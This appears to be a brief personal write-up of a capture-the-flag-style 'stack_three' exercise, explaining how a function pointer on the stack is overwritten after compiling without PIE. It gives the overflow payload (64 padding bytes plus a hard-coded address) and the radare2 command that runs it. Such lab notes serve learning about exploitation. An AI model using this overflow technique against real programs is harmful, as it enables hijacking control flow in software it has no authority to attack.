Challenge requires to override pointer which should then point to addr of function
Problem was the PIE feature used by default that randomizes entrypoint of program
I was therefore not able to determine addr of function beforehand to jump to.

disable with gcc -no-pie stack_three.c

Flag:
python -c 'print("A"*64+"\x62\x11\x40\x00")' > pattern.txt
r2 -r profile.rr2 -d a.out
